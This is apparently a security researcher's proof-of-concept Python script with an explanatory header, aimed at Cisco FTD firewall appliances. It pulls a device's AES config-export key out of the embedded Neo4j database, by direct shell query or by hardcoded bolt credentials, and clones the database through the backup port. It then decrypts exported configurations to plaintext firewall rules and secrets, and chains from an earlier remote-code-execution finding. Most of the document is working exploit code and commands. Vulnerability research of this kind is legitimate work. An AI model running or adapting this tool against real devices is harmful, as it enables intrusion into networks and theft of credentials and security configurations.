"""
F-FTD-65: FDM Config Export AES Key Extraction via Neo4j SerializationKey
CONTROLLED ENVIRONMENT ONLY

Root cause:
  EncryptionKeyBootstrap.bootstrapEntities() stores a random AES-128 key on
  first boot as a SerializationKey node in the embedded Neo4j database with a
  HARDCODED UUID: 6adc7474-37f8-482b-a9d2-8e0e34d1628a (same UUID on all FTDs).

  Key path:
    Neo4j node: (:SerializationKey {uuid: '6adc7474-37f8-482b-a9d2-8e0e34d1628a', key: '<b64>'})
    Cache: NGFWCache["encryptionkey64"] = BaseEncoding.base64().decode(key)
    Usage: ExportConfigFileServiceImpl.decryptFile() → AES/CTR/PKCS5PADDING
           Cipher layout: [16-byte IV][ciphertext...]

  Neo4j access method (confirmed from fdm-recover-neo4j.sh):
    /ngfw/var/jre/bin/java \
      -cp "/ngfw/var/cisco/ngfwWebUi/tomcat/webapps/ROOT/WEB-INF/lib/*" \
      org.neo4j.shell.StartClient \
      -path /ngfw/var/lib/db/ngfw.db \
      -c "MATCH (n:SerializationKey) RETURN n.key LIMIT 1;"

  DB owner: www:www — accessible as www user (Tomcat process user).

  Bolt fallback: Neo4jImplConfiguration hardcodes bolt://localhost credentials:
    username: admin
    password: Admin123
    URI: bolt://localhost (port 7687)
  Bolt connector only active when db.driver=bolt (not default production config).

Attack chain:
  1. Shell access as www or root (via F-FTD-60 → FDM RCE)
  2. Stop Tomcat (or run query while stopped, using same JARs)
  3. Query Neo4j for SerializationKey.key via neo4j-shell
  4. Base64-decode → 16-byte AES key
  5. Decrypt any .cfgz config export: AES/CTR/PKCS5PADDING, IV=first 16 bytes

Secondary attack surface:
  dbms.backup.enabled=true (production default)
  dbms.backup.address=127.0.0.1:9090
  Neo4j online backup protocol on localhost:9090 allows full DB clone.
  Use: neo4j-backup -host 127.0.0.1 -port 9090 -to /tmp/stolen.db
  Then query stolen.db offline with same neo4j-shell method.

Hardcoded UUID: 6adc7474-37f8-482b-a9d2-8e0e34d1628a — present on every FTD.
Key is device-specific (generated randomly at first boot) but stored in plaintext in Neo4j.

Affected: FTD 6.7.0-65. Same EncryptionKeyBootstrap code likely in 6.6.x, 7.0.x.
"""

# CONTROLLED ENVIRONMENT ONLY

import subprocess
import sys
import os
import base64
import struct

# Neo4j paths on FTD (confirmed from fdm-recover-neo4j.sh)
FTD_JAVA = "/ngfw/var/jre/bin/java"
FTD_NEO4J_DB = "/ngfw/var/lib/db/ngfw.db"
FTD_LIB_CLASSPATH = "/ngfw/var/cisco/ngfwWebUi/tomcat/webapps/ROOT/WEB-INF/lib/*"

# Hardcoded SerializationKey UUID — same on all FTD 6.7.0 instances
SERIALIZATION_KEY_UUID = "6adc7474-37f8-482b-a9d2-8e0e34d1628a"

# Cypher query to extract the AES key
CYPHER_QUERY = f"MATCH (n:SerializationKey {{uuid: '{SERIALIZATION_KEY_UUID}'}}) RETURN n.key LIMIT 1;"

# Bolt fallback credentials (hardcoded in Neo4jImplConfiguration.configureBoltDriver)
BOLT_URI = "bolt://localhost"
BOLT_USER = "admin"
BOLT_PASS = "Admin123"


def extract_key_via_neo4j_shell(java_path=FTD_JAVA, db_path=FTD_NEO4J_DB,
                                  classpath=FTD_LIB_CLASSPATH):
    """
    Extract SerializationKey via org.neo4j.shell.StartClient.
    Requires: www/root shell on FTD; Tomcat stopped or DB accessible.
    CONTROLLED ENVIRONMENT ONLY
    """
    print(f"[*] Querying Neo4j at {db_path}")
    print(f"[*] Cypher: {CYPHER_QUERY}")

    cmd = [
        java_path,
        "-cp", classpath,
        "org.neo4j.shell.StartClient",
        "-path", db_path,
        "-c", CYPHER_QUERY
    ]

    try:
        result = subprocess.run(
            cmd,
            capture_output=True, text=True, timeout=60
        )
        output = result.stdout + result.stderr
        print(f"[*] neo4j-shell output:\n{output[:1000]}")

        # Parse the key from output — neo4j-shell prints table-formatted results
        # Output format: +------------------+\n| n.key           |\n+------------------+\n| <base64key>      |
        for line in output.splitlines():
            line = line.strip().strip('|').strip()
            # Skip header/separator lines
            if line and not line.startswith('+') and 'n.key' not in line and len(line) > 20:
                # Validate it looks like base64
                try:
                    key_bytes = base64.b64decode(line)
                    if len(key_bytes) == 16:
                        print(f"\n[!] SerializationKey extracted: {line}")
                        print(f"    AES key bytes ({len(key_bytes)}): {key_bytes.hex()}")
                        return key_bytes
                except Exception:
                    continue

        print(f"[-] Could not parse key from neo4j-shell output")
        return None

    except FileNotFoundError:
        print(f"[-] {java_path} not found — are you running on FTD?")
        return None
    except subprocess.TimeoutExpired:
        print(f"[-] neo4j-shell timed out")
        return None
    except Exception as e:
        print(f"[-] Error: {e}")
        return None


def extract_key_via_bolt():
    """
    Extract SerializationKey via bolt://localhost (admin:Admin123).
    Only works if db.driver=bolt is configured (not default production).
    Requires neo4j Python driver: pip install neo4j
    CONTROLLED ENVIRONMENT ONLY
    """
    try:
        from neo4j import GraphDatabase
    except ImportError:
        print(f"[-] neo4j driver not installed: pip install neo4j")
        return None

    print(f"[*] Attempting bolt connection: {BOLT_URI} ({BOLT_USER}:{BOLT_PASS})")
    try:
        driver = GraphDatabase.driver(BOLT_URI, auth=(BOLT_USER, BOLT_PASS))
        with driver.session() as session:
            result = session.run(
                f"MATCH (n:SerializationKey {{uuid: $uuid}}) RETURN n.key LIMIT 1",
                uuid=SERIALIZATION_KEY_UUID
            )
            record = result.single()
            if record:
                key_b64 = record["n.key"]
                key_bytes = base64.b64decode(key_b64)
                print(f"[!] SerializationKey extracted via bolt: {key_b64}")
                print(f"    AES key bytes ({len(key_bytes)}): {key_bytes.hex()}")
                driver.close()
                return key_bytes
            else:
                print(f"[-] No SerializationKey found in bolt query")
                driver.close()
                return None
    except Exception as e:
        print(f"[-] Bolt connection failed: {e}")
        print(f"    (bolt connector may be disabled in production — use neo4j-shell path)")
        return None


def decrypt_config_export(encrypted_path, key_bytes, output_path=None):
    """
    Decrypt FTD config export file using extracted AES key.

    Cipher: AES/CTR/PKCS5PADDING
    Layout: [16-byte random IV][ciphertext...]

    Source: ExportConfigFileServiceImpl.decryptFile():
      generateEncryptionFileKey() → getEncryptionKeyFromCache() → NGFWCache["encryptionkey64"]
      writeDecryptedFile(key, reader, writer)
    And EncryptionUtil.encrypt(String, Key):
      IV = new byte[16]; secureRandom.nextBytes(IV)
      cipher.init(DECRYPT, key, new IvParameterSpec(IV))
      output = IV + ciphertext (IV prepended)

    CONTROLLED ENVIRONMENT ONLY
    """
    try:
        from Crypto.Cipher import AES
    except ImportError:
        print(f"[-] pycryptodome not installed: pip install pycryptodome")
        return False

    print(f"\n[*] Decrypting config export: {encrypted_path}")
    print(f"    AES key: {key_bytes.hex()}")

    try:
        with open(encrypted_path, 'rb') as f:
            data = f.read()

        if len(data) < 16:
            print(f"[-] File too short ({len(data)} bytes) — not a valid encrypted export")
            return False

        iv = data[:16]
        ciphertext = data[16:]

        print(f"    IV: {iv.hex()}")
        print(f"    Ciphertext length: {len(ciphertext)} bytes")

        cipher = AES.new(key_bytes, AES.MODE_CTR,
                         initial_value=int.from_bytes(iv, 'big'),
                         nonce=b'')
        plaintext = cipher.decrypt(ciphertext)

        # PKCS5 unpadding
        if plaintext:
            pad_len = plaintext[-1]
            if 1 <= pad_len <= 16:
                plaintext = plaintext[:-pad_len]

        if output_path is None:
            output_path = encrypted_path + ".decrypted.txt"

        with open(output_path, 'wb') as f:
            f.write(plaintext)

        print(f"[!] Decrypted config written to: {output_path}")
        print(f"    Size: {len(plaintext)} bytes")

        # Print first 500 chars
        try:
            text_preview = plaintext[:500].decode('utf-8', errors='replace')
            print(f"\n--- Config preview (first 500 chars) ---")
            print(text_preview)
            print(f"--- end preview ---")
        except Exception:
            print(f"    (binary content — not UTF-8 text)")

        return True

    except FileNotFoundError:
        print(f"[-] Encrypted file not found: {encrypted_path}")
        return False
    except Exception as e:
        print(f"[-] Decryption error: {e}")
        return False


def check_backup_port(host="127.0.0.1", port=9090):
    """
    Check if Neo4j backup protocol is listening on 127.0.0.1:9090.
    Production default: dbms.backup.enabled=true, dbms.backup.address=127.0.0.1:9090

    Neo4j backup clone: neo4j-backup -host <host> -port <port> -to /tmp/stolen.db
    Requires: neo4j-backup binary from Neo4j 3.4 enterprise distribution.
    CONTROLLED ENVIRONMENT ONLY
    """
    import socket
    try:
        s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
        s.settimeout(3)
        result = s.connect_ex((host, port))
        s.close()
        if result == 0:
            print(f"[!] Neo4j backup port OPEN: {host}:{port}")
            print(f"    Backup clone command:")
            print(f"    neo4j-backup -host {host} -port {port} -to /tmp/neo4j-stolen.db")
            print(f"    Then query offline with neo4j-shell:")
            print(f"    java -cp '/ngfw/var/cisco/ngfwWebUi/tomcat/webapps/ROOT/WEB-INF/lib/*' \\")
            print(f"         org.neo4j.shell.StartClient -path /tmp/neo4j-stolen.db \\")
            print(f"         -c \"{CYPHER_QUERY}\"")
            return True
        else:
            print(f"[-] Backup port closed/unreachable: {host}:{port}")
            return False
    except Exception as e:
        print(f"[-] Backup port check error: {e}")
        return False


if __name__ == '__main__':
    print("=" * 70)
    print("F-FTD-65: FDM Config Export AES Key Extraction via Neo4j")
    print("CONTROLLED ENVIRONMENT ONLY")
    print("=" * 70)
    print(f"""
Root cause:
  EncryptionKeyBootstrap stores AES-128 key in Neo4j as SerializationKey
  with hardcoded UUID: {SERIALIZATION_KEY_UUID}

  Two extraction paths:
    A) neo4j-shell: direct file access to /ngfw/var/lib/db/ngfw.db
    B) bolt://localhost (admin:Admin123) — only if db.driver=bolt configured

  Backup protocol (production default):
    dbms.backup.enabled=true / dbms.backup.address=127.0.0.1:9090
    Allows full offline DB clone without stopping Tomcat
""")

    mode = sys.argv[1] if len(sys.argv) > 1 else 'shell'

    if mode == 'shell':
        print(f"--- Mode: neo4j-shell (direct file access) ---")
        print(f"    Usage: {sys.argv[0]} shell [db_path] [encrypted_export]")
        db_path = sys.argv[2] if len(sys.argv) > 2 else FTD_NEO4J_DB
        export_path = sys.argv[3] if len(sys.argv) > 3 else None

        key = extract_key_via_neo4j_shell(db_path=db_path)
        if key and export_path:
            decrypt_config_export(export_path, key)

    elif mode == 'bolt':
        print(f"--- Mode: bolt driver (admin:Admin123 on localhost:7687) ---")
        export_path = sys.argv[2] if len(sys.argv) > 2 else None

        key = extract_key_via_bolt()
        if key and export_path:
            decrypt_config_export(export_path, key)

    elif mode == 'decrypt':
        if len(sys.argv) < 4:
            print(f"Usage: {sys.argv[0]} decrypt <encrypted_file> <key_hex>")
            print(f"  key_hex: 32-char hex string (16 bytes = AES-128)")
            sys.exit(1)
        encrypted_path = sys.argv[2]
        key_hex = sys.argv[3]
        key_bytes = bytes.fromhex(key_hex)
        decrypt_config_export(encrypted_path, key_bytes)

    elif mode == 'backup-check':
        print(f"--- Mode: backup port check ---")
        check_backup_port()

    elif mode == 'static':
        print(f"--- Mode: static analysis summary ---")
        print(f"""
Neo4j store path:  /ngfw/var/lib/db/ngfw.db (from fdm-recover-neo4j.sh)
JRE path:          /ngfw/var/jre/bin/java
Classpath:         /ngfw/var/cisco/ngfwWebUi/tomcat/webapps/ROOT/WEB-INF/lib/*
DB driver:         embedded (production) / bolt fallback (admin:Admin123)
Backup:            127.0.0.1:9090 (enabled in production)

Extraction command (run on FTD as www or root):
  /ngfw/var/jre/bin/java \\
    -cp "/ngfw/var/cisco/ngfwWebUi/tomcat/webapps/ROOT/WEB-INF/lib/*" \\
    org.neo4j.shell.StartClient \\
    -path /ngfw/var/lib/db/ngfw.db \\
    -c "MATCH (n:SerializationKey {{uuid: '{SERIALIZATION_KEY_UUID}'}}) RETURN n.key LIMIT 1;"

Decrypt export:
  python {sys.argv[0]} decrypt <config.cfgz> <key_hex_32chars>

Attack chain summary:
  F-FTD-60 (pre-auth FDM takeover) → admin API access
  → authenticated FDM API → trigger config export download
  → shell as www (Tomcat user) → neo4j-shell key extract
  → AES/CTR/PKCS5PADDING decrypt → plaintext config (firewall rules + secrets)
""")

    else:
        print(f"Usage: {sys.argv[0]} <shell|bolt|decrypt|backup-check|static>")

    print("\n[*] CONTROLLED ENVIRONMENT ONLY.")
